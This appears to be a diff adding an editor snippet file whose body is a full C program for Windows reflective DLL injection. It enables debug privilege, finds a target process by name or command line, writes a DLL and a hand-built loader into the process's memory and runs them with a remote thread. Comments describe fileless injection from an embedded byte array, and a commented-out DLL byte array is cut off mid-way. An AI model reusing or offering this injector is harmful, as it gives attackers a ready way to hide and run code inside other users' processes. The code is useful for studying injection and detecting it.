@@ -1,0 +1,611 @@
+<snippet>
+    <content>
+        <![CDATA[
+#include <stdio.h>
+#include <windows.h>
+#include <winternl.h>
+#include <tlhelp32.h>
+#include <string.h>
+#include <stdio.h>
+
+NTSTATUS WINAPI NtQueryInformationProcess(
+    HANDLE           ProcessHandle,
+    PROCESSINFOCLASS ProcessInformationClass,
+    PVOID            ProcessInformation,
+    ULONG            ProcessInformationLength,
+    PULONG           ReturnLength
+);
+
+typedef NTSTATUS (WINAPI *PFUN_NtQueryInformationProcess)(
+    HANDLE           ProcessHandle,
+    PROCESSINFOCLASS ProcessInformationClass,
+    PVOID            ProcessInformation,
+    ULONG            ProcessInformationLength,
+    PULONG           ReturnLength
+);
+
+#pragma comment(lib, "Advapi32")
+
+#define IS_32 1
+#define IS_64 2
+typedef struct {
+    LPVOID  base;
+    BOOL    reloc;
+    LPVOID  Get_Proc;
+    LPVOID  Load_DLL;
+} PE_INFO, *LPE_INFO;
+LPVOID v_ReadInMemory(char* FileName) {
+    HANDLE f,h;
+    LPVOID m;
+    if ((f = CreateFileA(
+            FileName, GENERIC_READ, FILE_SHARE_READ, 0, 
+            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)
+        ) == INVALID_HANDLE_VALUE){
+        return NULL;
+    }
+    if ((h = CreateFileMappingA(f,NULL,PAGE_READONLY,0,0,NULL)) == NULL){
+        return NULL;
+    }
+    if ((m = MapViewOfFile(h,FILE_MAP_READ,0,0,0)) == NULL){
+        return NULL;
+    }else {
+        return m;
+    }
+}
+HANDLE v_FindProcessByName(char* process_name) {
+    HANDLE snap, proc;
+    PROCESSENTRY32 ps;
+    BOOL found = 0;
+    ps.dwSize = sizeof(ps);
+    if((snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)) == INVALID_HANDLE_VALUE){
+        return NULL;
+    }
+    if(!Process32First(snap,&ps)){
+        return NULL;
+    }
+    do {
+        if(!strcmp(process_name,ps.szExeFile)) {
+            found = 1;
+            break;
+        }
+    }while(Process32Next(snap,&ps));
+    CloseHandle(snap);
+    if(!found)
+        return NULL;
+    if((proc = OpenProcess(PROCESS_ALL_ACCESS,0,ps.th32ProcessID)) == NULL) {
+        return NULL;
+    }else{
+        return proc;
+    }
+}
+void v_AdjustPe32(LPE_INFO pe) {
+    PIMAGE_DOS_HEADER           dos;
+    PIMAGE_NT_HEADERS           nt;
+    LPVOID                      base;
+    PIMAGE_IMPORT_DESCRIPTOR    import;
+    PIMAGE_THUNK_DATA           Othunk,Fthunk;
+    PIMAGE_BASE_RELOCATION      reloc;
+    PIMAGE_TLS_DIRECTORY        tls;
+    PIMAGE_TLS_CALLBACK*        CallBack;
+    ULONG*                      p,delta;
+    BOOL        (*DLL_Entry)    (LPVOID, DWORD, LPVOID);
+    LPVOID      (*Load_DLL)     (LPSTR);
+    LPVOID      (*Get_Proc)     (LPVOID, LPSTR);
+    base       = pe->base;
+    Load_DLL   = pe->Load_DLL;
+    Get_Proc   = pe->Get_Proc;
+    dos        = (PIMAGE_DOS_HEADER)base;
+    nt         = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+    DLL_Entry  = base+nt->OptionalHeader.AddressOfEntryPoint;
+    if(pe->reloc){
+        if(nt->OptionalHeader.DataDirectory[5].VirtualAddress != 0){
+            delta = (ULONG)base-nt->OptionalHeader.ImageBase;
+            reloc = (PIMAGE_BASE_RELOCATION)(base+nt->OptionalHeader.DataDirectory[5].VirtualAddress);
+            while(reloc->VirtualAddress) {
+                LPVOID  dest    = base+reloc->VirtualAddress;
+                int     nEntry  = (reloc->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/2;
+                PWORD   data    = (PWORD)((LPVOID)reloc+sizeof(IMAGE_BASE_RELOCATION));
+                int i;
+                for(i = 0; i<nEntry; i++,data++) {
+                    if(((*data) >> 12) == 10) {
+                        p = (PULONG)(dest+((*data)&0xfff));
+                        *p += delta;
+                    }
+                }
+                reloc = (PIMAGE_BASE_RELOCATION)((LPVOID)reloc+reloc->SizeOfBlock);
+            }
+        }
+    }
+    if(nt->OptionalHeader.DataDirectory[1].VirtualAddress != 0){
+        import = (PIMAGE_IMPORT_DESCRIPTOR)(base+nt->OptionalHeader.DataDirectory[1].VirtualAddress);
+        while(import->Name) {
+            LPVOID dll = (*Load_DLL)(base+import->Name);
+            Othunk = (PIMAGE_THUNK_DATA)(base+import->OriginalFirstThunk);
+            Fthunk = (PIMAGE_THUNK_DATA)(base+import->FirstThunk);
+            if(!import->OriginalFirstThunk){
+                Othunk = Fthunk;
+            }
+            while(Othunk->u1.AddressOfData) {
+                if(Othunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
+                    *(ULONG *)Fthunk = (ULONG)(*Get_Proc)(dll,(LPSTR)IMAGE_ORDINAL(Othunk->u1.Ordinal));
+                }
+                else {
+                    PIMAGE_IMPORT_BY_NAME fnm = (PIMAGE_IMPORT_BY_NAME)(base+Othunk->u1.AddressOfData);
+                    *(PULONG)Fthunk = (ULONG)(*Get_Proc)(dll,fnm->Name);
+                }
+                Othunk++;
+                Fthunk++;
+            }
+            import++;
+        }
+    }
+    if(nt->OptionalHeader.DataDirectory[9].VirtualAddress != 0){
+        tls = (PIMAGE_TLS_DIRECTORY)(base+nt->OptionalHeader.DataDirectory[9].VirtualAddress);
+        if(tls->AddressOfCallBacks != 0){
+            CallBack = (PIMAGE_TLS_CALLBACK *)(tls->AddressOfCallBacks);
+            while(*CallBack) {
+                (*CallBack)(base,DLL_PROCESS_ATTACH,NULL);
+                CallBack++;
+            }
+        }
+    }
+    (*DLL_Entry)(base,DLL_PROCESS_ATTACH,NULL);
+}
+void v_AdjustPe32_END(){};
+
+
+void v_AdjustPe64(LPE_INFO pe) {
+    PIMAGE_DOS_HEADER           dos;
+    PIMAGE_NT_HEADERS           nt;
+    LPVOID                      base;
+    PIMAGE_IMPORT_DESCRIPTOR    import;
+    PIMAGE_THUNK_DATA           Othunk,Fthunk;
+    PIMAGE_BASE_RELOCATION      reloc;
+    PIMAGE_TLS_DIRECTORY        tls;
+    PIMAGE_TLS_CALLBACK*        CallBack;
+    ULONGLONG*                  p,delta;
+    BOOL        (*DLL_Entry)    (LPVOID, DWORD, LPVOID);
+    LPVOID      (*Load_DLL)     (LPSTR);
+    LPVOID      (*Get_Proc)     (LPVOID, LPSTR);
+    base       = pe->base;
+    Load_DLL   = pe->Load_DLL;
+    Get_Proc   = pe->Get_Proc;
+    dos        = (PIMAGE_DOS_HEADER)base;
+    nt         = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+    DLL_Entry  = base+nt->OptionalHeader.AddressOfEntryPoint;
+    if(pe->reloc){
+        if(nt->OptionalHeader.DataDirectory[5].VirtualAddress != 0){
+            delta = (ULONGLONG)base-nt->OptionalHeader.ImageBase;
+            reloc = (PIMAGE_BASE_RELOCATION)(base+nt->OptionalHeader.DataDirectory[5].VirtualAddress);
+            while(reloc->VirtualAddress) {
+                LPVOID  dest    = base+reloc->VirtualAddress;
+                int     nEntry  = (reloc->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/2;
+                PWORD   data    = (PWORD)((LPVOID)reloc+sizeof(IMAGE_BASE_RELOCATION));
+                int i;
+                for(i = 0; i<nEntry; i++,data++) {
+                    if(((*data) >> 12) == 10) {
+                        p = (PULONGLONG)(dest+((*data)&0xfff));
+                        *p += delta;
+                    }
+                }
+                reloc = (PIMAGE_BASE_RELOCATION)((LPVOID)reloc+reloc->SizeOfBlock);
+            }
+        }
+    }
+    if(nt->OptionalHeader.DataDirectory[1].VirtualAddress != 0){
+        import = (PIMAGE_IMPORT_DESCRIPTOR)(base+nt->OptionalHeader.DataDirectory[1].VirtualAddress);
+        while(import->Name) {
+            LPVOID dll = (*Load_DLL)(base+import->Name);
+            Othunk = (PIMAGE_THUNK_DATA)(base+import->OriginalFirstThunk);
+            Fthunk = (PIMAGE_THUNK_DATA)(base+import->FirstThunk);
+            if(!import->OriginalFirstThunk){
+                Othunk = Fthunk;
+            }
+            while(Othunk->u1.AddressOfData) {
+                if(Othunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
+                    *(ULONGLONG *)Fthunk = (ULONGLONG)(*Get_Proc)(dll,(LPSTR)IMAGE_ORDINAL(Othunk->u1.Ordinal));
+                }
+                else {
+                    PIMAGE_IMPORT_BY_NAME fnm = (PIMAGE_IMPORT_BY_NAME)(base+Othunk->u1.AddressOfData);
+                    *(PULONGLONG)Fthunk = (ULONGLONG)(*Get_Proc)(dll,fnm->Name);
+                }
+                Othunk++;
+                Fthunk++;
+            }
+            import++;
+        }
+    }
+    if(nt->OptionalHeader.DataDirectory[9].VirtualAddress != 0){
+        tls = (PIMAGE_TLS_DIRECTORY)(base+nt->OptionalHeader.DataDirectory[9].VirtualAddress);
+        if(tls->AddressOfCallBacks != 0){
+            CallBack = (PIMAGE_TLS_CALLBACK *)(tls->AddressOfCallBacks);
+            while(*CallBack) {
+                (*CallBack)(base,DLL_PROCESS_ATTACH,NULL);
+                CallBack++;
+            }
+        }
+    }
+    (*DLL_Entry)(base,DLL_PROCESS_ATTACH,NULL);
+}
+void v_AdjustPe64_END(){};
+
+
+
+
+
+
+
+int v_InjectDllRef(LPVOID base, HANDLE proc){
+    LPVOID      Rbase,Adj;
+    DWORD       Func_Size;
+    PE_INFO     pe;
+    PIMAGE_DOS_HEADER       dos;
+    PIMAGE_SECTION_HEADER   sec;
+    PIMAGE_NT_HEADERS       nt;
+    printf("[+] Opening File...\n");
+    if(base == NULL) {
+        printf("[-] File I/O Error\n");
+        return 0;
+    }
+    dos = (PIMAGE_DOS_HEADER)base;
+    if(dos->e_magic != 23117) {
+        printf("[-] Invalid File\n");
+        return 0;
+    }
+    nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+    sec = (PIMAGE_SECTION_HEADER)((LPVOID)nt + 24 + nt->FileHeader.SizeOfOptionalHeader);
+    int TYPE = 0;
+    if(nt->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
+        TYPE = IS_32;
+        printf("[+] This dll is 32 bit pe\n");
+    }
+    else if(nt->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+        TYPE = IS_64;
+        printf("[+] This dll is 64 bit pe\n");
+    }
+    else{
+        printf("[-] This dll is not 32/64 bit pe\n");
+        return 0;
+    }
+    printf("[+] Open Process.....\n");
+    if(proc == NULL) {
+        printf("[-] Failed To Open Process\n");
+        return 0;
+    }
+    printf("[+] Allocating Memory Into Remote Process\n");
+    pe.reloc = 0;
+    if((Rbase = VirtualAllocEx(proc,(LPVOID)nt->OptionalHeader.ImageBase,nt->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)) == NULL) {
+        printf(" [!] Failed To Allocate Memory AT %#p\n", nt->OptionalHeader.ImageBase);
+        printf(" [!] Trying Alternative\n");
+        pe.reloc = 1;
+        if((Rbase = VirtualAllocEx(proc,NULL,nt->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)) == NULL) {
+            printf("[-] Failed To Allocate Memory Into Remote Process\n");
+            return 0;
+        }
+    }
+    printf("[+] Copying Headers\n");
+    WriteProcessMemory(proc,Rbase,base,nt->OptionalHeader.SizeOfHeaders,NULL);
+    printf("[+] Copying Sections...\n");
+    for(int i = 0; i<nt->FileHeader.NumberOfSections; i++) {
+        WriteProcessMemory(proc, Rbase+sec->VirtualAddress, base+sec->PointerToRawData, sec->SizeOfRawData, NULL);
+        sec++;
+    }
+    if (TYPE == IS_32){
+        Func_Size = (DWORD)((ULONG)v_AdjustPe32_END-(ULONG)v_AdjustPe32);
+    }else if (TYPE == IS_64){
+        Func_Size = (DWORD)((ULONGLONG)v_AdjustPe64_END-(ULONGLONG)v_AdjustPe64);
+    }
+    pe.base = Rbase;
+    pe.Get_Proc = GetProcAddress(LoadLibraryA("kernel32"), "GetProcAddress");
+    pe.Load_DLL = GetProcAddress(LoadLibraryA("kernel32"), "LoadLibraryA");
+    Adj = VirtualAllocEx(proc, NULL, Func_Size+sizeof(pe), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if(Adj == NULL) {
+        printf("[-] Failed To Allocate Memory for PE adjusting\n");
+        VirtualFreeEx(proc, Rbase, 0, MEM_RELEASE);
+        return 0;
+    }
+    WriteProcessMemory(proc, Adj, &pe, sizeof(pe), NULL);
+    if (TYPE == IS_32){
+        WriteProcessMemory(proc, Adj+sizeof(pe), v_AdjustPe32, Func_Size, NULL);
+    }else if (TYPE == IS_64){
+        WriteProcessMemory(proc, Adj+sizeof(pe), v_AdjustPe64, Func_Size, NULL);
+    }
+    if(!CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)(Adj+sizeof(pe)), Adj, 0, NULL)){
+        printf("[-] Failed TO Adjust PE\n");
+    }else{
+        printf("[+] Adjusting PE And Executing....\n");
+    }
+    return 0;
+}
+
+
+
+
+int v_getProcessCommandLineByHandle(HANDLE process_handle, WCHAR** result){
+    PROCESS_BASIC_INFORMATION pbi = {0};
+    HMODULE hModule = LoadLibraryA("Ntdll.dll");
+    PFUN_NtQueryInformationProcess pfun = 
+        (PFUN_NtQueryInformationProcess)GetProcAddress(hModule, "NtQueryInformationProcess");
+    NTSTATUS status = pfun(process_handle, ProcessBasicInformation, (PVOID)&pbi, sizeof(pbi), NULL);
+    if (!pbi.PebBaseAddress){
+        return 1;
+    }
+    PPEB peb = pbi.PebBaseAddress;
+    HANDLE procesHandle;
+    procesHandle = process_handle;
+    PEB stPeb;
+    RTL_USER_PROCESS_PARAMETERS stProParam;
+    DWORD dwDummy;
+    if (!ReadProcessMemory(procesHandle, pbi.PebBaseAddress, &stPeb, sizeof(stPeb), NULL)){
+        return 2;
+    }
+    if (!ReadProcessMemory(procesHandle, stPeb.ProcessParameters, &stProParam, sizeof(stProParam), NULL)) {
+        return 3;
+    }
+    LPVOID lpAddress;
+    DWORD dwSize;
+    lpAddress = stProParam.CommandLine.Buffer;
+    dwSize = stProParam.CommandLine.Length;
+    WCHAR* pszCmdLineBuffer = malloc((dwSize + 1) * sizeof(WCHAR));
+    ZeroMemory(pszCmdLineBuffer, (dwSize + 1) * sizeof(WCHAR));
+    if (!ReadProcessMemory(procesHandle, lpAddress, (LPVOID)pszCmdLineBuffer, dwSize, NULL)){
+        return 4;
+    }
+    *result = pszCmdLineBuffer;
+    return 0;
+}
+int v_getProcessCommandLineById(DWORD pid, WCHAR** result){
+    HANDLE handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    return v_getProcessCommandLineByHandle(handle, result);
+}
+HANDLE v_EnumProcessAll() {
+    HANDLE snap, proc;
+    PROCESSENTRY32 ps;
+    BOOL found = 0;
+    ps.dwSize = sizeof(ps);
+    if((snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)) == INVALID_HANDLE_VALUE){
+        return NULL;
+    }
+    if(!Process32First(snap,&ps)){
+        return NULL;
+    }
+    WCHAR* result;
+    do {
+        if (!v_getProcessCommandLineById(ps.th32ProcessID, &result)){
+            printf("[*] %s[%d] parentID:%d ---> %ls\n", ps.szExeFile, ps.th32ProcessID, ps.th32ParentProcessID, result);
+        }else{
+            printf("[*] %s[%d] parentID:%d ---> [getCommandLineError]\n", ps.szExeFile, ps.th32ProcessID, ps.th32ParentProcessID, result);
+        }
+        // free(&result);
+    }while(Process32Next(snap,&ps));
+    CloseHandle(snap);
+    if(!found)
+        return NULL;
+    if((proc = OpenProcess(PROCESS_ALL_ACCESS,0,ps.th32ProcessID)) == NULL) {
+        return NULL;
+    }else{
+        return proc;
+    }
+}
+HANDLE v_EnumProcessByName(char* process_name) {
+    HANDLE snap, proc;
+    PROCESSENTRY32 ps;
+    BOOL found = 0;
+    ps.dwSize = sizeof(ps);
+    if((snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)) == INVALID_HANDLE_VALUE){
+        return NULL;
+    }
+    if(!Process32First(snap,&ps)){
+        return NULL;
+    }
+    WCHAR* result;
+    do {
+        if (!v_getProcessCommandLineById(ps.th32ProcessID, &result)){
+            if (!strcmp(process_name, ps.szExeFile)){
+                printf("[*] %s[%d] parentID:%d ---> %ls\n", ps.szExeFile, ps.th32ProcessID, ps.th32ParentProcessID, result);
+            }
+        }
+        // free(&result);
+    }while(Process32Next(snap,&ps));
+    CloseHandle(snap);
+    if(!found)
+        return NULL;
+    if((proc = OpenProcess(PROCESS_ALL_ACCESS,0,ps.th32ProcessID)) == NULL) {
+        return NULL;
+    }else{
+        return proc;
+    }
+}
+HANDLE v_EnumProcessByNameAndCommand(char* process_name, WCHAR* cmd) {
+    HANDLE snap, proc;
+    PROCESSENTRY32 ps;
+    BOOL found = 0;
+    ps.dwSize = sizeof(ps);
+    if((snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)) == INVALID_HANDLE_VALUE){
+        return NULL;
+    }
+    if(!Process32First(snap,&ps)){
+        return NULL;
+    }
+    WCHAR* result;
+    do {
+        if (!v_getProcessCommandLineById(ps.th32ProcessID, &result)){
+            if (!strcmp(process_name, ps.szExeFile)){
+                if (wcsstr(result, cmd)){
+                    printf("[*] %s[%d] parentID:%d ---> %ls\n", ps.szExeFile, ps.th32ProcessID, ps.th32ParentProcessID, result);
+                }
+            }
+        }
+        // free(&result);
+    }while(Process32Next(snap,&ps));
+    CloseHandle(snap);
+    if(!found)
+        return NULL;
+    if((proc = OpenProcess(PROCESS_ALL_ACCESS,0,ps.th32ProcessID)) == NULL) {
+        return NULL;
+    }else{
+        return proc;
+    }
+}
+HANDLE v_EnumProcessByNameAndPosRevCommand(char* process_name, WCHAR* cmd1, WCHAR* cmd2) {
+    HANDLE snap, proc;
+    PROCESSENTRY32 ps;
+    BOOL found = 0;
+    ps.dwSize = sizeof(ps);
+    if((snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)) == INVALID_HANDLE_VALUE){
+        return NULL;
+    }
+    if(!Process32First(snap,&ps)){
+        return NULL;
+    }
+    WCHAR* result;
+    do {
+        if (!v_getProcessCommandLineById(ps.th32ProcessID, &result)){
+            if (!strcmp(process_name, ps.szExeFile)){
+                if (wcsstr(result, cmd1) && (!wcsstr(result, cmd2))){
+                    printf("[*] %s[%d] parentID:%d ---> %ls\n", ps.szExeFile, ps.th32ProcessID, ps.th32ParentProcessID, result);
+                }
+            }
+        }
+        // free(&result);
+    }while(Process32Next(snap,&ps));
+    CloseHandle(snap);
+    if(!found)
+        return NULL;
+    if((proc = OpenProcess(PROCESS_ALL_ACCESS,0,ps.th32ProcessID)) == NULL) {
+        return NULL;
+    }else{
+        return proc;
+    }
+}
+
+HANDLE v_FindProcessByNameAndCommand(char* process_name, WCHAR* cmd) {
+    HANDLE snap, proc;
+    PROCESSENTRY32 ps;
+    BOOL found = 0;
+    ps.dwSize = sizeof(ps);
+    if((snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)) == INVALID_HANDLE_VALUE){
+        return NULL;
+    }
+    if(!Process32First(snap,&ps)){
+        return NULL;
+    }
+    WCHAR* result;
+    do {
+        if (!v_getProcessCommandLineById(ps.th32ProcessID, &result)){
+            if (!strcmp(process_name, ps.szExeFile)){
+                if (wcsstr(result, cmd)){
+                    printf("[*] %s[%d] %ls\n", ps.szExeFile, ps.th32ProcessID, result);
+                    found = 1;
+                    break;
+                }
+            }
+        }
+    }while(Process32Next(snap,&ps));
+    CloseHandle(snap);
+    if(!found)
+        return NULL;
+    if((proc = OpenProcess(PROCESS_ALL_ACCESS,0,ps.th32ProcessID)) == NULL) {
+        return NULL;
+    }else{
+        return proc;
+    }
+}
+HANDLE v_FindProcessByNameAndPosRevCommand(char* process_name, WCHAR* cmd1, WCHAR* cmd2) {
+    HANDLE snap, proc;
+    PROCESSENTRY32 ps;
+    BOOL found = 0;
+    ps.dwSize = sizeof(ps);
+    if((snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)) == INVALID_HANDLE_VALUE){
+        return NULL;
+    }
+    if(!Process32First(snap,&ps)){
+        return NULL;
+    }
+    WCHAR* result;
+    do {
+        if (!v_getProcessCommandLineById(ps.th32ProcessID, &result)){
+            if (!strcmp(process_name, ps.szExeFile)){
+                if (wcsstr(result, cmd1) && (!wcsstr(result, cmd2))){
+                    printf("[*] %s[%d] %ls\n", ps.szExeFile, ps.th32ProcessID, result);
+                    found = 1;
+                    break;
+                }
+            }
+        }
+    }while(Process32Next(snap,&ps));
+    CloseHandle(snap);
+    if(!found)
+        return NULL;
+    if((proc = OpenProcess(PROCESS_ALL_ACCESS,0,ps.th32ProcessID)) == NULL) {
+        return NULL;
+    }else{
+        return proc;
+    }
+}
+BOOL v_AdjustPrivileges() {
+    HANDLE hToken = NULL;
+    TOKEN_PRIVILEGES tp;
+    TOKEN_PRIVILEGES oldtp;
+    DWORD dwSize = sizeof(TOKEN_PRIVILEGES);
+    LUID luid;
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
+        CloseHandle(hToken);
+        return FALSE;
+    }
+    ZeroMemory(&tp, sizeof(tp));
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), &oldtp, &dwSize)) {
+        CloseHandle(hToken);
+        return FALSE;
+    }
+    CloseHandle(hToken);
+    return TRUE;
+}
+BOOL v_PaeEnalbed() {
+    return IsProcessorFeaturePresent(PF_PAE_ENABLED);
+}
+BOOL v_IsMultiCore() {
+    SYSTEM_INFO sysInfo;
+    GetSystemInfo(&sysInfo);
+    return sysInfo.dwNumberOfProcessors != 1;
+}
+
+int main(int i, char** arg) {
+    // 两种注入方式：
+    // 1直接把dll以字符流方式包到本工具中（dll文件完全不落地注入）
+    // 2通过读取dll文件数据注入
+
+    // unsigned char DLLBit[] = {77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,128,0,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111,116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32,109,111,100,101,46,13,13,10,36,0,0,0,0,0,0,0,80,69,0,0,100,134,3,0,0,0,0,0,0,0,0,0,0,0,0,0,240,0,46,34,11,2,6,0,0,2,0,0,0,4,0,0,0,0,0,0,208,16,0,0,0,16,0,0,0,0,0,16,0,0,0,0,0,16,0,0,0,2,0,0,4,0,0,0,0,0,0,0,4,0,0,0,0,0,0,0,0,64,0,0,0,2,0,0,131,39,0,0,2,0,0,0,0,0,16,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,80,0,0,0,0,0,0,0,0,0,0,0,0,48,0,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,80,32,0,0,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,46,116,101,120,116,0,0,0,56,1,0,0,0,16,0,0,0,2,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,96,46,100,97,116,97,0,0,0,48,1,0,0,0,32,0,0,0,2,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,192,46,112,100,97,116,97,0,0,24,0,0,0,0,48,0,0,0,2,0,0,0,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,64,85,72,137,229,72,129,236,48,1,0,0,72,137,77,16,72,137,85,24,76,137,69,32,233,134,0,0,0,184,4,1,0,0,73,137,192,72,141,133,252,254,255,255,73,137,195,72,184,0,0,0,0,0,0,0,0,73,137,194,76,137,209,76,137,218,232,210,0,0,0,232,213,0,0,0,72,137,133,240,254,255,255,72,141,133,252,254,255,255,73,137,194,76,137,209,232,196,0,0,0,184,0,0,0,0,73,137,193,72,141,133,252,254,255,255,73,137,192,72,139,133,240,254,255,255,73,137,195,72,184,0,0,0,0,0,0,0,0,73,137,194,76,137,209,76,137,218,232,152,0,0,0,233,32,0,0,0,233,27,0,0,0,139,69,24,131,248,0,116,238,131,248,1,15,132,105,255,255,255,131,248,2,116,224,131,248,3,116,219,184,1,0,0,0,201,195,1,4,2,5,4,3,1,80,0,0,0,0,85,72,137,229,72,129,236,48,0,0,0,72,137,77,16,72,137,85,24,76,137,69,32,72,139,69,32,73,137,192,139,69,24,73,137,195,72,139,69,16,73,137,194,76,137,209,76,137,218,232,250,254,255,255,137,69,252,139,69,252,201,195,0,0,1,4,2,5,4,3,1,80,255,37,50,15,0,0,0,0,255,37,50,15,0,0,0,0,255,37,58,15,0,0,0,0,255,37,66,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,136,32,0,0,0,0,0,0,0,0,0,0,192,32,0,0,80,32,0,0,160,32,0,0,0,0,0,0,0,0,0,0,244,32,0,0,104,32,0,0,176,32,0,0,0,0,0,0,0,0,0,0,17,33,0,0,120,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,205,32,0,0,0,0,0,0,226,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,205,32,0,0,0,0,0,0,226,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,107,101,114,110,101,108,51,50,46,100,108,108,0,0,0,71,101,116,77,111,100,117,108,101,70,105,108,101,78,97,109,101,65,0,0,0,71,101,116,67,111,109,109,97,110,100,76,105,110,101,65,0,115,104,108,119,97,112,105,46,100,108,108,0,0,0,80,97,116,104,83,116,114,105,112,80,97,116,104,65,0,117,115,101,114,51,50,46,100,108,108,0,0,0,77,101,115,115,97,103,101,66,111,120,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,16,0,0,196,16,0,0,196,16,0,0,219,16,0,0,14,17,0,0,16,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,